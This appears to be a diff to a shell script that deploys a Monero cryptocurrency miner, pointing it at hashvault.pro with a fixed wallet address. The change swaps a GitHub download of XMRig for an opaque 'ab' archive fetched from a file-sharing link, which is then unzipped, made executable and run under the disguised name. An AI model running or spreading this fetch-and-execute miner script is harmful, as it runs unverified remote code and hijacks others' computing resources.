@@ -1,7 +1,8 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-bionic-x64.tar.gz
+wget https://download1083.mediafire.com/p61f4jm992eg/s5q7dn0o0vxnqyl/ab.zip
 sleep 3
-tar xf xmrig-6.12.1-bionic-x64.tar.gz
+unzip ab
 sleep 3
-cd xmrig-6.12.1
+cd ab
 sleep 3
-sudo ./xmrig --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+chmod +x ./ab
+./ab --url pool.hashvault.pro:80 --user hvxy26Fsyz3GiKdKH9sP96T8UKyd7D1hnedoXYVawNkg84nxvr2J8X5XcRHoPya1paftqpLcK2ucnePS8avVNkYv9wHQ4E87cp --pass Heysitkd --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
